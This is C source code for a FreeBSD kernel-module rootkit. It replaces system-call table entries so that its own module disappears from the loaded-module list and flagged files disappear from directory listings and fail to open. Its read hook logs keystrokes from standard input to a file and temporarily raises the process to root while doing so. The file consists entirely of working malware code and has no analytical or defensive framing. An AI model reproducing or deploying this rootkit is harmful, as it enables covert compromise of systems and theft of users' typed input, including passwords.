#include "rootkit.h"



/*
SYSCALLS TO HOOK:
chdir
chmod
chown
execve
getdirentries
ioctl
kill
kldload
kldnext
kldsym
kldunload
lstat
open
openat
pread
preadv
pwrite
pwritev
read
readv
rename
rmdir
stat
truncate
unlink
write
writev
*/

static linker_file_t linker_find_file_by_id(int fileid) {
	linker_file_t lf;

	sx_assert(&kld_sx, SA_XLOCKED);
	TAILQ_FOREACH(lf, &linker_files, link)
		if (lf->id == fileid && lf->flags & LINKER_FILE_LINKED)
			break;
	return (lf);
}

int insert_hooks(void) {
	sysent[SYS_kldnext].sy_call = (sy_call_t *)hook_sys_kldnext;
	sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_sys_getdirentries;
	sysent[SYS_open].sy_call = (sy_call_t *)hook_sys_open;
	sysent[SYS_openat].sy_call = (sy_call_t *)hook_sys_openat;
	sysent[SYS_read].sy_call = (sy_call_t *)hook_sys_read;
	return 0;
}

int remove_hooks(void) {
	sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
	sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
	sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
	sysent[SYS_openat].sy_call = (sy_call_t *)sys_openat;
	sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
	return 0;
}

int hook_sys_getdirentries(struct thread *td, struct getdirentries_args *uap)
{
	long base;
	int error;

	struct dirent *dp, *current;
	unsigned int size, count;

	error = kern_getdirentries(td,uap->fd, uap->buf, uap->count, &base, NULL, UIO_USERSPACE);

	if (error!=0) return error;
	if (uap->basep != NULL){
		error = copyout(&base, uap->basep, sizeof(long));

	}


	size = td->td_retval[0];

	if (size > 0){
		MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
		copyin(uap->buf,dp,size);
		current = dp;
		count = size;

		while((current->d_reclen != 0) && (count > 0)){
			count -= current->d_reclen;
			char * this_file = (char*)current->d_name;
			if(check_file(this_file) && !(get_flags(this_file) & R_FLAG_VIEW)){
				if (count != 0){
					bcopy((char*)current + current->d_reclen, current, count);
				}
				size-=current->d_reclen;
			}
			else if (count != 0){
				current = (struct dirent *)((char*)current + current->d_reclen);
			}
		}
		td->td_retval[0] = size;
		copyout(dp,uap->buf,size);

		FREE(dp,M_TEMP);
	}


	return (error);
}

int hook_sys_kldnext(struct thread *td, struct kldnext_args *uap)
{
	linker_file_t lf;
	int error = 0;

	sx_xlock(&kld_sx);

	if (uap->fileid == 0)
		lf = TAILQ_FIRST(&linker_files);
	else {
		lf = linker_find_file_by_id(uap->fileid);
		if (lf == NULL) {
			error = ENOENT;
			goto out;
		}
		lf = TAILQ_NEXT(lf, link);
	}

	/* Skip partially loaded files. */
	while (lf != NULL && !(lf->flags & LINKER_FILE_LINKED))
		lf = TAILQ_NEXT(lf, link);

	if(lf && strcmp(lf->filename, LINKER_FILE) == 0) {
		lf = TAILQ_NEXT(lf, link);
	}

	if(lf)
		td->td_retval[0] = lf->id;
	else
		td->td_retval[0] = 0;
out:
	sx_xunlock(&kld_sx);
	return (error);
}

int hook_sys_open(struct thread * td, struct open_args * uap) {
	if(check_file(uap->path)) {
		int flag = uap->flags & 0x3;
		uint8_t rk_flags = get_flags(uap->path);
		if(flag == O_RDONLY && !(rk_flags & R_FLAG_READ)) {
			return ENOENT;
		}
		if(flag == O_WRONLY && !(rk_flags & R_FLAG_WRITE)) {
			return ENOENT;
		}
		if(flag == O_RDWR && (!(rk_flags & R_FLAG_READ) || !(rk_flags & R_FLAG_WRITE))) {
			return ENOENT;
		}
	}
	return sys_open(td, uap);
}

int hook_sys_openat(struct thread * td, struct openat_args * uap) {
	if(check_file(uap->path)) {
		int flag = uap->flag & 0x3;
		uint8_t rk_flags = get_flags(uap->path);
		if(flag == O_RDONLY && !(rk_flags & R_FLAG_READ)) {
			return ENOENT;
		}
		if(flag == O_WRONLY && !(rk_flags & R_FLAG_WRITE)) {
			return ENOENT;
		}
		if(flag == O_RDWR && (!(rk_flags & R_FLAG_READ) || !(rk_flags & R_FLAG_WRITE))) {
			return ENOENT;
		}
	}
	return sys_openat(td, uap);
}

int hook_sys_read(struct thread *td, struct read_args * uap){

	int error = 0;

	// error = sys_read(td, uap);
	// if(error)
	// 	return error;

	// if(uap->fd == 0 && uap->nbyte > 1) {
		// int fd;
		// uid_t savedcreds = td->td_proc->p_ucred->cr_uid;
		// td->td_proc->p_ucred->cr_uid = 0;
		// error = filewriter_openlog(td, &fd, KEYSTROKE);
		// if(error)
		// 	printf("err1: %d\n", error);
		// error = filewriter_writelog(td, fd, uap->buf, uap->nbyte);
		// if(error)
		// 	printf("err2: %d\n", error);
		// error = filewriter_closelog(td, fd);
		// if(error)
		// 	printf("err3: %d\n", error);
		// td->td_proc->p_ucred->cr_uid = savedcreds;
	// }

	// return error;


	error = sys_read(td, uap);
	char buf[1];
	int done;

	if(error || uap->nbyte == 0 || uap->nbyte > 1 || uap->fd != 0)
		return(error);

	copyinstr(uap->buf, buf, 1, &done);

	printf("%c\n", buf[0]);

	int fd;
	uid_t savedcreds = td->td_proc->p_ucred->cr_uid;
	td->td_proc->p_ucred->cr_uid = 0;
	error = filewriter_openlog(td, &fd, KEYSTROKE);
	error = filewriter_writelog(td, fd, uap->buf, uap->nbyte);
	error = filewriter_closelog(td, fd);
	td->td_proc->p_ucred->cr_uid = savedcreds;

	return(error);

}
